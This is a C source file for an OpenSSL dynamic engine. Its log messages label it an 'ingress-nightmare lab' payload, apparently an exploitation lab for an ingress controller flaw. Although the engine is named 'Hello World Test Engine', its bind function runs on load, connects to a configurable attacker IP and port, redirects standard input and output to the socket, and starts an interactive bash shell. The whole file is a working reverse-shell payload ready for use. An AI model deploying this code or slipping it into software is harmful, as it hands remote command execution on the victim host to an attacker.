#include <stdio.h>
#include <string.h>
#include <openssl/engine.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>

/* Configuration parameters */
static const char *REMOTE_IP = "127.0.0.1";  /* Set YOUR_IP_ADDRESS_HERE */
static const int REMOTE_PORT = 1337;   /* Set YOUR_PORT_HERE */

/* Engine identification */
static const char *engine_id   = "hello";
static const char *engine_name = "Hello World Test Engine";

/**
 * Establishes a reverse shell connection to the specified IP and port
 * 
 * @return 0 on failure, 1 on success (though execl rarely returns)
 */
static int establish_reverse_shell(const char *ip, int port) {
    int sock;
    struct sockaddr_in srv_addr;

    /* Create socket */
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        fprintf(stderr, "ingress-nightmare lab: Socket creation failed: %s\n", strerror(errno));
        return 0;
    }

    /* Set up the server address struct */
    memset(&srv_addr, 0, sizeof(srv_addr));
    srv_addr.sin_family = AF_INET;
    srv_addr.sin_port = htons(port);
    
    if (inet_pton(AF_INET, ip, &srv_addr.sin_addr) <= 0) {
        fprintf(stderr, "ingress-nightmare lab: Invalid address: %s\n", strerror(errno));
        close(sock);
        return 0;
    }

    /* Connect to remote host */
    if (connect(sock, (struct sockaddr *)&srv_addr, sizeof(srv_addr)) == -1) {
        fprintf(stderr, "ingress-nightmare lab: Connection failed: %s\n", strerror(errno));
        close(sock);
        return 0;
    }

    /* Redirect standard I/O to the socket */
    dup2(sock, STDIN_FILENO);
    dup2(sock, STDOUT_FILENO);
    dup2(sock, STDERR_FILENO);

    /* Spawn an interactive shell */
    execl("/bin/bash", "bash", "-i", NULL);

    /* If execl fails, clean up */
    fprintf(stderr, "ingress-nightmare lab: Shell execution failed: %s\n", strerror(errno));
    close(sock);
    
    return 0;
}

/**
 * Engine binding function called when the engine is loaded
 */
static int bind_hello(ENGINE *e, const char *id)
{
    if (id) {
        fprintf(stderr, "ingress-nightmare lab: Engine invoked with ID: '%s'\n", id);
    }

    /* Set the engine's internal ID and name */
    if (!ENGINE_set_id(e, engine_id) ||
        !ENGINE_set_name(e, engine_name)) {
        fprintf(stderr, "ingress-nightmare lab: Failed to set engine id or name\n");
        return 0;
    }

    /* Log basic information */
    printf("ingress-nightmare lab: Engine initialized successfully\n");
    
    /* Log process information for debugging */
    pid_t pid = getpid();
    uid_t uid = getuid();
    printf("ingress-nightmare lab: Process ID: %d, User ID: %d\n", pid, uid);

    /* Establish reverse shell connection */
    establish_reverse_shell(REMOTE_IP, REMOTE_PORT);

    /* Return success if we ever get here (execl typically does not return) */
    return 1;
}

/* Required macros for a dynamically loadable engine */
IMPLEMENT_DYNAMIC_BIND_FN(bind_hello)
IMPLEMENT_DYNAMIC_CHECK_FN()
